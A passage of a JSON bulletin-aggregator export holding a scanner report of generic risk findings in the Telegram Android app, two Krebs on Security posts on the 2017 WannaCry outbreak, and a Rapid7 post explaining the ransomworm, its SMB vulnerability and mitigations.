"https://hackapp.com/report/e2b1149eaa9f1f9212cd9063922824fb", "cvss": {"score": 0.0, "vector": "NONE"}, "hashmap": [{"key": "affectedSoftware", "hash": "636e7e8f1ab031310a383d7e148da197"}, {"key": "bulletinFamily", "hash": "f9fa10ba956cacf91d7878861139efb9"}, {"key": "cvelist", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "533dbc4ae8abddec8b6dea50a6204322"}, {"key": "hackapp", "hash": "0c930925021bdcba15c2360cd3e15cbe"}, {"key": "href", "hash": "6e04b0059b23693151cee0f15c3c4811"}, {"key": "modified", "hash": "b28ec5779d451484295f0891ab043d7d"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "b28ec5779d451484295f0891ab043d7d"}, {"key": "references", "hash": "8446644073e004049a0f2b093bf8a68b"}, {"key": "reporter", "hash": "3b012aae1848bb95fe11f3cebae83cb0"}, {"key": "title", "hash": "4385c53a9372ef87df73906f8f0af993"}, {"key": "type", "hash": "96e87ef1fcc8d9d3cdd337488987c423"}], "hash": "b5a613eed1de947cce611cf51b394e5f064b6da25145b8a34e69a4cd8594d7d9"}, {"lastseen": "2017-05-12T21:24:42", "references": ["https://play.google.com/store/apps/details?id=org.telegram.messenger&hl=en"], "description": "HackApp vulnerability scanner discovered that application Telegram published at the 'play' market has multiple vulnerabilities.", "edition": 3, "reporter": "Hackapp.org", "published": "2017-05-12T21:43:42", "title": "Telegram - Dangerous filesystem permissions, WebView code execution vulnerabilities", "type": "hackapp", "objectVersion": "1.2", "bulletinFamily": "software", "affectedSoftware": [{"name": "Telegram", "version": "Varies with device", "operator": "le"}], "hackapp": {"bugs": [{"severity": "medium", "name": "WebView JavaScript enabled", "description": "WebView 'setJavaScriptEnabled(true)' could be exploited during cross-site scripting attacks.", "id": "f8fc434bb36d013331bda6436e153e1a"}, {"severity": "notice", "name": "Suspicious files", "description": "Are you sure these files should be here?", "id": "1430400f316c7c8306bc087437fc2782"}, {"severity": "notice", "name": "Native code usage", "description": "Native code (.so) usage 'System.loadLibrary();' is found.", "id": "07a9aa3b4fd4195af3063c02498fad30"}, {"severity": "medium", "name": "Runtime command execution", "description": "Function 'Runtime.getRuntime().exec()' is used, please check where variables are come from.", "id": "9a858d7f2bb92ecd78e04859bf986e27"}, {"severity": "medium", "name": "SD-card access", "description": "SD-cards and other external storages have 'worldwide read' policy.", "id": "a5cde7be99ca8b5ce8ba041e4f2fb327"}, {"severity": "notice", "name": "Unsafe deleting", "description": "All items deleted with 'file.delete()' could be recovered.", "id": "73791b254409fb4d362208d7ab8c3507"}, {"severity": "critical", "name": "WebView code execution", "description": "WebView 'addJavascriptInterface' could be used to control the host app with JavaScript bindings. Remote Code Execution (RCE) is possible.", "id": "b2a1f0e2425628c2125fe7ee1b78b143"}, {"severity": "critical", "name": "Dangerous filesystem permissions", "description": "Files created with these methods could be worldwide readable.", "id": "dd7728fcc96f6596337c85bed36c7d64"}, {"severity": "medium", "name": "Exported components", "description": "Other applications could access the interfaces.", "id": "e81d4c3faf7f74b5908e0275acefbd25"}, {"severity": "notice", "name": "Possible privilege escalation", "description": "This app is looking for root tools.", "id": "809257a038b1dce6b4d474d15a7d2336"}, {"severity": "notice", "name": "External URLs", "description": "Were do they point?", "id": "533a942ab9c915aa9eef8168497edc52"}, {"severity": "medium", "name": "WebView files access", "description": "Control of WebView context allows to access local files.

\t\t\t", "id": "000d89b518d4403ef81af80a6bf79f9a"}], "release": "2017-04-06T00:00:00", "vendor": "Telegram Messenger LLP", "icon": "http://lh3.googleusercontent.com/jVXglyWWL5J2y1vRN-7Jy3_ozvvZc4w5486IAkbAIrWcNN_vn7YuIvhc1JDtGq43BqGl=w300", "link": "https://play.google.com/store/apps/details?id=org.telegram.messenger&hl=en", "name": "Telegram", "store": "play", "apk": "ORG.TELEGRAM.MESSENGER.APK", "version": "Varies with device"}, "cvelist": [], "modified": "2017-05-12T21:43:42", "id": "HACKAPP:ORG.TELEGRAM.MESSENGER.APK", "href": "https://hackapp.com/report/e574dd6037fa88813b49ac814a854bc6", "cvss": {"score": 0.0, "vector": "NONE"}, "hashmap": [{"key": "affectedSoftware", "hash": "a2e8d2a462535f8644c5a10af536f7d8"}, {"key": "bulletinFamily", "hash": "f9fa10ba956cacf91d7878861139efb9"}, {"key": "cvelist", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "3c60623e346d7f4191e6ddb3bd581afc"}, {"key": "hackapp", "hash": "954d842d547af21cc0fdc0b887d36200"}, {"key": "href", "hash": "8fca80c9fb37d710986c0cfc9859b577"}, {"key": "modified", "hash": "142d7985303a132d51b5a9855924cc44"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "142d7985303a132d51b5a9855924cc44"}, {"key": "references", "hash": "317f6da76fd2a157ebcc6e132f834590"}, {"key": "reporter", "hash": "3b012aae1848bb95fe11f3cebae83cb0"}, {"key": "title", "hash": "0be617c1acc3f1c8927a46dde7084d63"}, {"key": "type", "hash": "96e87ef1fcc8d9d3cdd337488987c423"}], "hash": "e618a9656ef271876b0964ba0081ef1298f4f367767e6965b070e9a8070620e5"}], "krebs": [{"lastseen": "2017-05-13T21:01:54", "references": [], "description": "As thousands of organizations work to contain and clean up the mess from this week's [devastating **Wana** ransomware attack](<https://krebsonsecurity.com/2017/05/u-k-hospitals-hit-in-widespread-ransomware-attack/>), the fraudsters responsible for releasing the digital contagion are no doubt counting their earnings and congratulating themselves on a job well done. But according to a review of the Bitcoin addresses hard-coded into Wana, it appears the perpetrators of what's being called the worst ransomware outbreak ever have made little more than USD $26,000 so far from the scam.



![Victims of the Wana ransomware will see this lock screen demanding a $300 ransom to unlock all encrypted files. ](https://krebsonsecurity.com/wp-content/uploads/2017/05/wanalock-580x435.png)



Victims of the Wana ransomware will see this lock screen demanding a $300 ransom to unlock all encrypted files.



The Wana ransomware became a global epidemic virtually overnight this week, after criminals started distributing copies of the malware with the help of a security vulnerability in **Windows** computers that **Microsoft** patched in March 2017. Infected computers have all their documents and other important user files scrambled with strong encryption, and victims without access to good backups of that data have two choices: Kiss the data goodbye, or pay the ransom -- the equivalent of approximately USD $300 worth of the virtual currency Bitcoin.



According to [a detailed writeup](<https://www.redsocks.eu/news/ransomware-wannacry/>) on the Wana ransomware published Friday by security firm **Redsocks**, Wana contains three bitcoin payment addresses that are hard-coded into the malware. One of the nice things about Bitcoin is that anyone can view all of the historic transactions tied a given Bitcoin payment address. As a result, it's possible to tell how much the criminals at the helm of this crimeware spree have made so far and how many victims have paid the ransom.



_A review of the three payment addresses hardcoded into the Wana ransomware strain indicates that these accounts to date have received 100 payments totaling slightly more than 15 Bitcoins -- or approximately $26,148 at the current Bitcoin-to-dollars exchange rate._



#### ANALYSIS



It is possible that the crooks responsible for this attack maintained other Bitcoin addresses that were used to receive payments in connection with this attack, but there is currently no evidence of that. It's worth noting that the ransom note Wana popped up on victim screens (see screenshot above) included a \"Contact Us\" feature that may have been used by some victims to communicate directly with the fraudsters. Also, I realize that in many ways USD $26,000 is a great deal of money.



However, I find it depressing to think of the massive financial damage likely wrought by this ransom campaign in exchange for such a comparatively small reward. It's particularly galling because this attack potentially endangered the lives of many. At least 16 hospitals in the United Kingdom were [diverting patients and rescheduling procedures on Friday](<https://krebsonsecurity.com/2017/05/microsoft-issues-wanacrypt-patch-for-windows-8-xp/>) thanks to the Wana outbreak, meaning the attack may well have hurt people physically (no deaths have been reported so far, thank goodness).



Unfortunately, this glaring disparity is par for the course with cybercrime in general. As I observed on several occasions in my book [_Spam Nation_](<https://www.amazon.com/Spam-Nation-Organized-Cybercrime-Epidemic-ebook/dp/B00L5QGBL0/ref=dp_kinw_strp_1>) -- which tracked the careers of some of the most successful malware writers and pharmacy pill spammers on the planet -- it was often disheartening to see how little money most of those guys made given the sheer amount of digital disease they were pumping out into the Internet on a daily basis.



In fact, very few of these individuals made much money at all, and yet they were responsible for perpetuating a global crime machine that inflicted enormous damage on businesses and consumers. A quote in the book from **Stefan Savage**, a computer science professor at the University of California, San Diego (UCSD) encapsulates the disparity quite nicely and seems to have aged quite well:



\"What's fascinating about all this is that at the end of the day, we're not talking about all that much money,\" Savage said. \"These guys running the pharma programs are not Donald Trumps, yet their activity is going to have real and substantial financial impact on the day-to-day lives of tens of millions of people. In other words, for these guys to make modest riches, we need a multibillion-dollar industry to deal with them.\"", "edition": 1, "reporter": "BrianKrebs", "published": "2017-05-13T20:10:43", "title": "Global \u2018Wana\u2019 Ransomware Outbreak Earned Perpetrators $26,000 So Far", "type": "krebs", "objectVersion": "1.2", "bulletinFamily": "blog", "cvelist": [], "modified": "2017-05-13T20:10:43", "id": "KREBS:E7885E83474AB6F6BDDCF4C023EB59F0", "href": "https://krebsonsecurity.com/2017/05/global-wana-ransomware-outbreak-earned-perpetrators-26000-so-far/", "cvss": {"score": 0.0, "vector": "NONE"}, "hashmap": [{"key": "bulletinFamily", "hash": "126ac9f6149081eb0e97c2e939eaad52"}, {"key": "cvelist", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "716ca8ab811aa1d704588364db7b6de6"}, {"key": "href", "hash": "6c16a9d43f424212380dca3ec9aae742"}, {"key": "modified", "hash": "ae29f6c085efc89519c9f6e67bd6b6d7"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "ae29f6c085efc89519c9f6e67bd6b6d7"}, {"key": "references", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "reporter", "hash": "012ff71ddeb3def59db494f4bb22c188"}, {"key": "title", "hash": "ea3fb1453e678dc86d2a4fb6a4779397"}, {"key": "type", "hash": "f0c54e92ec10445a9af4fabcb8f38fe2"}], "hash": "95cee754e20a478734bdd3b361cd0b35f6bf45490727b0c3835622641a2adb0e"}, {"lastseen": "2017-05-13T17:01:52", "references": [], "description": "**Microsoft Corp.** today took the unusual step of issuing security updates to address flaws in older, unsupported versions of Windows -- including **Windows XP** and **Windows 8**. The move is a bid to slow the spread of the **WanaCrypt** ransomware strain that infected tens of thousands of Windows computers virtually overnight this week.



![A map tracking the global spread of the Wana ransomware strain. Image: Malwaretech.com. ](https://krebsonsecurity.com/wp-content/uploads/2017/05/wanamap-580x256.png)



A map tracking the global spread of the Wana ransomware strain. Image: Malwaretech.com.



On Friday, May 12, countless organizations around the world began fending off attacks from a ransomware strain variously known as WannaCrypt, WanaDecrypt and Wanna.Cry. Ransomware encrypts a victim\u2019s documents, images, music and other files unless the victim pays for a key to unlock them.



It quickly became apparent that Wanna was spreading with the help of [a file-sharing vulnerability in Windows](<https://technet.microsoft.com/en-us/library/security/ms17-010.aspx>). Microsoft issued a patch to fix this flaw back in March 2017, but organizations running older, unsupported versions of Windows (such as Windows XP) were unable to apply the update because Microsoft no longer supplies security patches for those versions of Windows.



The software giant today made an exception to that policy after it became clear that many organizations hit hardest by Wanna were those still running older, unsupported versions of Windows.



\"Seeing businesses and individuals affected by cyberattacks, such as the ones reported today, was painful,\" [wrote](<https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/>) **Phillip Misner**, principal security group manager at the Microsoft Security Response Center. \"Microsoft worked throughout the day to ensure we understood the attack and were taking all possible actions to protect our customers.\"



The update to address the file-sharing bug that Wanna is using to spread is now available for Windows XP, Windows 8, and Windows Server 2003 via the links at the bottom of [this advisory](<https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/>).



On Friday, at least 16 hospitals in the United Kingdom were forced to divert emergency patients after computer systems there were infected with Wanna. According to multiple stories in the [British media](<http://www.telegraph.co.uk/news/2017/05/12/nhs-hit-major-cyber-attack-hackers-demanding-ransom/>), approximately 90 percent of care facilities in the U.K.\u2019s **National Health Service **are still using Windows XP \u2013 a 16-year-old operating system.



According to [a tweet](<https://twitter.com/JakubKroustek/status/863188326039396352>) from **Jakub Kroustek**, a malware researcher with security firm **Avast, **the company's software has detected more than 100,000 instances of the Wana ransomware.



For advice on how to harden your systems against ransomware, please see the tips in [this post](<https://krebsonsecurity.com/2016/12/before-you-pay-that-ransomware-demand/>).", "edition": 2, "reporter": "BrianKrebs", "published": "2017-05-13T13:00:06", "title": "Microsoft Issues WanaCrypt Patch for Windows 8, XP", "type": "krebs", "objectVersion": "1.2", "bulletinFamily": "blog", "cvelist": [], "modified": "2017-05-13T13:00:06", "id": "KREBS:1D18F06D917B579F529C8C6FCBC833FE", "href": "https://krebsonsecurity.com/2017/05/microsoft-issues-wanacrypt-patch-for-windows-8-xp/", "cvss": {"score": 0.0, "vector": "NONE"}, "hashmap": [{"key": "bulletinFamily", "hash": "126ac9f6149081eb0e97c2e939eaad52"}, {"key": "cvelist", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "1f5ded116ca380becaf837fad37a7bde"}, {"key": "href", "hash": "ad9060f6721ced176cdcff27cda08600"}, {"key": "modified", "hash": "8bca790bb27e87ea80bec8e4ffe32123"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "8bca790bb27e87ea80bec8e4ffe32123"}, {"key": "references", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "reporter", "hash": "012ff71ddeb3def59db494f4bb22c188"}, {"key": "title", "hash": "2bd5e0e1fef37c0ae576f7cfadf5ba19"}, {"key": "type", "hash": "f0c54e92ec10445a9af4fabcb8f38fe2"}], "hash": "2b6c8b0e5d06b6ce5d8457aee1ae3f850b59cd9e8d0f19315813f30f0d2e41e2"}], "rapid7community": [{"lastseen": "2017-05-13T15:48:23", "references": [], "description": "<!-- [DocumentBodyStart:b911f73d-af60-47af-9082-4b5587dd2900] --><div class=\"jive-rendered-content\"><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: black;\">Mark the date: May 12, 2017.</span></p><p style=\"min-height: 8pt; padding: 0px; margin-bottom: .0001pt; background: white;\"> </p><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: black;\">This is the day the “ransomworm” dubbed “WannaCry” / “</span><span style=\"color: #231f20;\"><a class=\"jive-link-external-small\" href=\"/external-link.jspa?url=https%3A%2F%2Fwww.microsoft.com%2Fsecurity%2Fportal%2Fthreat%2Fencyclopedia%2FEntry.aspx%3FName%3DRansom%3AWin32%2FWannacrypt.A%21rsm\" rel=\"nofollow\" target=\"_blank\"><span style=\"color: #1155cc;\">Wannacrypt</span></a></span><span style=\"color: black;\">” burst — literally — onto the scene with one of the initial targets being the </span><span style=\"color: #231f20;\"><a class=\"jive-link-external-small\" href=\"/external-link.jspa?url=http%3A%2F%2Fwww.bbc.com%2Fnews%2Fhealth-39899646\" rel=\"nofollow\" target=\"_blank\"><span style=\"color: #1155cc;\">British National Health Service</span></a></span><span style=\"color: black;\">. According to </span><span style=\"color: #231f20;\"><a class=\"jive-link-external-small\" href=\"/external-link.jspa?url=https%3A%2F%2Fwww.theguardian.com%2Fsociety%2F2017%2Fmay%2F12%2Fhospitals-across-england-hit-by-large-scale-cyber-attack\" rel=\"nofollow\" target=\"_blank\"><span style=\"color: #1155cc;\">The Guardian</span></a></span><span style=\"color: black;\">: the <em>“unprecedented attack… affected 12 countries and at least 16 NHS trusts in the UK, compromising IT systems that underpin patient safety. Staff across the NHS were locked out of their computers and trusts had to divert emergency patients.” </em>A larger estimate by various cybersecurity firms indicates that over 70 countries have been impacted in some way by the WannaCry worm. As of this post's creation time, a group with the Twitter handle @0xSpamTech has <a class=\"jive-link-external-small\" href=\"/external-link.jspa?url=https%3A%2F%2Ftwitter.com%2F0xSpamTech%2Fstatus%2F863058605473509378\" rel=\"nofollow\" target=\"_blank\"><span style=\"color: #3f98d4;\">claimed responsibility</span></a> for instigating the attack but this has not yet been confirmed.</span></p><p style=\"min-height: 8pt; padding: 0px; margin-bottom: .0001pt; background: white;\"> </p><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: black;\">What is involved in the attack, what weakness(es) and systems does it exploit, and what can you do to prevent or recover from this attack? The following sections will dive into the details and provide guidance on how to mitigate the impact from future attacks.</span></p><p style=\"min-height: 8pt; padding: 0px;\"> </p><h2><strong>What is \"Ransomware\"?</strong></h2><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: black;\">Ransomware </span></p><p style=\"margin-bottom: 0.0001pt; background: white; padding-left: 30px;\"><span style=\"color: black;\"><em>“malicious software which covertly encrypts your files – preventing you from accessing them – then demands      payment for their safe recovery. Like most tactics employed in cyberattacks, ransomware attacks can occur after      clicking on a phishing link or visiting a compromised website.” (</em></span><span style=\"color: #231f20;\"><a class=\"jive-link-external-small\" href=\"/external-link.jspa?url=https%3A%2F%2Fwww.rapid7.com%2Fsolutions%2Fransomware%2F\" rel=\"nofollow\" target=\"_blank\"><span style=\"color: #1155cc;\"><em>https://www.rapid7.com/solutions/ransomware/</em></span></a></span><span style=\"color: black;\"><em>)</em></span></p><p style=\"min-height: 8pt; padding: 0px; margin-bottom: .0001pt; background: white;\"> </p><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: black;\">However, WannaCry ransomware deviates from the traditional ransomware definition by including a component that is able to find vulnerable systems on a local network and spread that way as well. This type of malicious software behavior is called a “worm” and the use of such capabilities dates back to 1988 when the </span><span style=\"color: #231f20;\"><a class=\"jive-link-external-small\" href=\"/external-link.jspa?url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FMorris_worm\" rel=\"nofollow\" target=\"_blank\"><span style=\"color: #1155cc;\">Morris Worm spread</span></a></span><span style=\"color: black;\"> across the internet (albeit a much smaller neighborhood at the time).</span></p><p style=\"min-height: 8pt; padding: 0px; margin-bottom: .0001pt; background: white;\"> </p><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: black;\">Because WannaCry combines two extremely destructive capabilities, it has been far more disruptive and destructive than previous cases of ransomware that we’ve seen over the past 18-24 months.</span></p><p style=\"min-height: 8pt; padding: 0px; margin-bottom: .0001pt; background: white;\"> </p><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: black;\">While the attackers are seeking ransom — you can track payments to their Bitcoin addresses:</span></p><ul style=\"list-style-type: disc;\"><li><span style=\"color: #231f20;\">115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn</span></li><li><span style=\"color: #231f20;\">12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw</span></li><li><span style=\"color: #231f20;\">13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94</span></li></ul><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: black;\">here: </span><span style=\"color: #1155cc;\"><a class=\"jive-link-external-small\" href=\"/external-link.jspa?url=https%3A%2F%2Fblockchain.info%2Faddress%2F\" rel=\"nofollow\" target=\"_blank\"><span style=\"color: #3f98d4;\">https://blockchain.info/address/</span></a> —</span><span style=\"color: black;\"> there have been reports of this also corrupting drives, adding a destructive component as well as a ransom-recovery component to the attack.</span></p><p style=\"min-height: 8pt; padding: 0px; margin-bottom: .0001pt; background: white;\"> </p><h2><strong>What Systems Are Impacted?</strong></h2><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: black;\">WannaCry only targets Microsoft Windows systems and is known to impact the following versions:</span></p><ul style=\"list-style-type: disc;\"><li><span style=\"color: #231f20;\">Microsoft Windows Vista SP2</span></li><li><span style=\"color: #231f20;\">Windows Server 2008 SP2 and R2 SP1</span></li><li><span style=\"color: #231f20;\">Windows 7</span></li><li><span style=\"color: #231f20;\">Windows 8.1</span></li><li><span style=\"color: #231f20;\">Windows RT 8.1</span></li><li><span style=\"color: #231f20;\">Windows Server 2012 and R2</span></li><li><span style=\"color: #231f20;\">Windows 10</span></li><li><span style=\"color: #231f20;\">Windows Server 2016</span></li><li><span style=\"color: #231f20;\">Windows XP (</span></li></ul><p style=\"min-height: 8pt; padding: 0px; margin-bottom: .0001pt; background: white;\"> </p><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: black;\">However, all versions of Windows are likely vulnerable and on May 13, 2017 <a class=\"jive-link-external-small\" href=\"https://community.rapid7.com/external-link.jspa?url=https%3A%2F%2Fblogs.technet.microsoft.com%2Fmsrc%2F2017%2F05%2F12%2Fcustomer-guidance-for-wannacrypt-attacks%2F\" rel=\"nofollow\" target=\"_blank\">Microsoft issued a notification</a> that included links to patches for all impacted Windows operating systems — including Windows XP.</span></p><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: #231f20;\"><br/></span><span style=\"color: black;\">As noted, Windows XP is impacted as well. That version of Windows still occupies a 7-10% share of usage (as measured by NetMarketshare):</span></p><p style=\"min-height: 8pt; padding: 0px; margin-bottom: .0001pt; background: white;\"> </p><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: #231f20;\"><a href=\"https://community.rapid7.com/servlet/JiveServlet/showImage/38-7869-66934/pastedImage_2.png\"><img class=\"image-1 jive-image\" height=\"208\" src=\"https://community.rapid7.com/servlet/JiveServlet/downloadImage/38-7869-66934/pastedImage_2.png\" style=\"max-width:624px; max-\" width=\"624\"/></a><br/></span><span style=\"color: black;\">and, this usage figure likely does not include endpoint counts from countries like China, who have significant use of “aftermarket” versions of Windows XP and other Windows systems, making them unpatchable.</span></p><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: #231f20;\"><br/></span><span style=\"color: black;\">The “worm” component takes advantage of a Remote Code Execution (RCE) vulnerability that is present in the part of Windows that makes it possible to share files over the network (known as “Server Message Block” or SMB). Microsoft released a patch -<a class=\"jive-link-external-small\" href=\"/external-link.jspa?url=https%3A%2F%2Ftechnet.microsoft.com%2Fen-us%2Flibrary%2Fsecurity%2Fms17-010.aspx\" rel=\"nofollow\" target=\"_blank\"><span style=\"color: #3f98d4;\">MS17-010</span></a> - for this vulnerability on March 14th, 2017 prior to the release of U.S. National Security Agency (NSA) tools (EternalBlue / DoublePulsar) by a group known as the the Shadow Brokers. Rapid7’s Threat Intelligence Lead, Rebekah Brown, wrote a breakdown of this release in a <a class=\"jive-link-blog-small\" data-containerId=\"5165\" data-containerType=\"37\" data-objectId=\"7842\" data-objectType=\"38\" href=\"https://community.rapid7.com/community/infosec/blog/2017/04/18/the-shadow-brokers-leaked-exploits-faq\"><span style=\"color: #3f98d4;\">blog post</span></a> in April.</span></p><p style=\"min-height: 8pt; padding: 0px; margin-bottom: .0001pt; background: white;\"> </p><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: black;\">Vulnerability detection tools, such as Rapid7’s Metasploit, have had detection capabilities for this weakness for a while, with the most recent <span style=\"color: #3f98d4;\"><a class=\"jive-link-external-small\" href=\"https://community.rapid7.com/external-link.jspa?url=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fblob%2Fmaster%2Fmodules%2Fauxiliary%2Fscanner%2Fsmb%2Fsmb_ms17_010.rb\" rel=\"nofollow\" target=\"_blank\">Metasploit module</a></span> being updated on April 30, 2017.</span></p><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: #231f20;\"><br/> </span><span style=\"color: black;\">This ransomworm can be spread by someone being on public Wi-Fi or an infected firm’s “guest” WiFi and then taking an infected-but-not-fully-encrypted system to another network. WannaCry is likely being spread, still, by both the traditional phishing vector as well as this network worm vector.</span></p><p style=\"min-height: 8pt; padding: 0px; margin-bottom: .0001pt; background: white;\"> </p><h2><strong>What Can You Do?</strong></h2><ul style=\"list-style-type: disc;\"><li><span style=\"color: #231f20;\">Ensure that all systems have been patched against MS17-010 vulnerabilities.</span></li><li><span style=\"color: #231f20;\">Identify any internet-facing systems that have not been patched and remediate as soon as possible.</span></li><li><span style=\"color: #231f20;\">Employ network and host-based firewalls to block TCP/445 traffic from untrusted systems. If possible, block 445 inbound to all internet-facing Windows systems.</span></li><li><span style=\"color: #231f20;\">Ensure critical systems and files have up-to-date backups. <strong>Backups are the only full mitigation against data loss due to ransomware.</strong></span></li></ul><p style=\"min-height: 8pt; padding: 0px; margin-bottom: .0001pt; background: white;\"> </p><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: black;\">NOTE:   The Rapid7 Managed Detection & Resoponse (MDR) SOC has developed detection indicators of compromise (IOCs) for this campaign, however we are only alerted once the malware executes on a compromised system. <strong>This is not a mitigation step.</strong></span></p><p style=\"min-height: 8pt; padding: 0px; margin-bottom: .0001pt; background: white;\"> </p><h2><strong>A Potentially Broader Impact</strong></h2><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: black;\">We perform regular SMB scans as a part of </span><span style=\"color: #231f20;\"><a class=\"jive-link-external-small\" href=\"/external-link.jspa?url=http%3A%2F%2Fsonar.labs.rapid7.com%2F\" rel=\"nofollow\" target=\"_blank\"><span style=\"color: #1155cc;\">Project Sonar</span></a></span><span style=\"color: black;\"> and detected over 1.8 million devices responding to full SMB connection in our May 3, 2017 scan:</span></p><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: #231f20;\"> <a href=\"https://community.rapid7.com/servlet/JiveServlet/showImage/38-7869-66935/pastedImage_9.png\"><img class=\"image-2 jive-image\" height=\"424\" src=\"https://community.rapid7.com/servlet/JiveServlet/downloadImage/38-7869-66935/758-424/pastedImage_9.png\" style=\"width:758px; height: 432.071px;\" width=\"758\"/></a></span></p><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: black;\">Some percentage of these systems may be Linux/UNIX servers emulating the SMB protocol but it’s likely that a large portion are Windows systems. Leaving SMB (via TCP port 445) open to the internet is also a sign that these systems are not well maintained, and are also susceptible to attack.</span></p><p style=\"min-height: 8pt; padding: 0px; margin-bottom: .0001pt; background: white;\"> </p><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: black;\">Rapid7’s Heisenberg Cloud — a system of honeypots spread throughout the internet — has seen a recent spike in probes for systems on port 445 as well:</span></p><p style=\"min-height: 8pt; padding: 0px; margin-bottom: .0001pt; background: white;\"> </p><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: #231f20;\"><a href=\"https://community.rapid7.com/servlet/JiveServlet/showImage/38-7869-66936/pastedImage_10.png\"><img class=\"image-3 jive-image\" height=\"357\" src=\"https://community.rapid7.com/servlet/JiveServlet/downloadImage/38-7869-66936/689-357/pastedImage_10.png\" style=\" width: 689.533px;\" width=\"689\"/></a></span></p><p style=\"min-height: 8pt; padding: 0px; margin-bottom: .0001pt; background: white;\"> </p><h2><strong>Living With Ransomware</strong></h2><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: black;\">Ransomware has proven to be an attractive and lucrative vector for cybercriminals. As stated previously, backups, along with the ability to quickly re-provision/image an impacted system, are your only real defenses. Rapid7 has additional resources available for you to learn more about dealing with ransomware:</span></p><ul style=\"list-style-type: disc;\"><li><span style=\"color: black;\">Understanding Ransomware: </span><span style=\"color: #231f20;\"><a class=\"jive-link-external-small\" href=\"/external-link.jspa?url=https%3A%2F%2Fwww.rapid7.com%2Fresources%2Funderstanding-ransomware%2F\" rel=\"nofollow\" target=\"_blank\"><span style=\"color: #1155cc;\">https://www.rapid7.com/resources/understanding-ransomware/</span></a></span></li><li><span style=\"color: black;\">Ransomware FAQ: </span><span style=\"color: #231f20;\"><a class=\"jive-link-blog-small\" data-containerId=\"5165\" data-containerType=\"37\" data-objectId=\"7453\" data-objectType=\"38\" href=\"https://community.rapid7.com/community/infosec/blog/2016/03/22/ransomware-faq-avoiding-the-latest-trend-in-malware\"><span style=\"color: #1155cc;\">https://community.rapid7.com/community/infosec/blog/2016/03/22/ransomware-faq-av oiding-the-latest-trend-in-malware</span></a></span></li></ul><p style=\"min-height: 8pt; padding: 0px; margin-bottom: .0001pt; background: white;\"> </p><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: black;\">If you’d like more information on this particular ransomworm as seen by Project Sonar or Heisenberg Cloud, please contact research [at] rapid7 [dot] com.</span></p><p style=\"min-height: 8pt; padding: 0px; margin-bottom: .0001pt; background: white;\"> </p><p style=\"margin-bottom: .0001pt; background: white;\"><span style=\"color: black;\">Many thanks to the many contributors across Rapid7 who provided vital information and content for this post.</span></p></div><!-- [DocumentBodyEnd:b911f73d-af60-47af-9082-4b5587dd2900] -->", "edition": 4, "reporter": "Bob Rudis", "published": "2017-05-13T12:12:04", "title": "Wanna Decryptor (WNCRY) Ransomware Explained", "type": "rapid7community", "objectVersion": "1.2", "bulletinFamily": "blog", "cvelist": [], "modified": "2017-05-13T12:12:04", "id": "RAPID7COMMUNITY:D3D7147076BA78C86854F507F5A7B33F", "href": "https://community.rapid7.com/community/infosec/blog/2017/05/12/wanna-decryptor-wncry-ransomware-explained", "cvss": {"score": 0.0, "vector": "NONE"}, "hashmap": [{"key": "bulletinFamily", "hash": "126ac9f6149081eb0e97c2e939eaad52"}, {"key": "cvelist", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "00c805b86888b943866a8e2473a2f904"}, {"key": "href", "hash": "d3d7147076ba78c86854f507f5a7b33f"}, {"key": "modified", "hash": "5a8e84595d94ba468a5b5d6f52df0171"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "5a8e84595d94ba468a5b5d6f52df0171"}, {"key": "references", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "reporter", "hash": "2494a30888a869bd198dae0cbabcead0"}, {"key": "title", "hash": 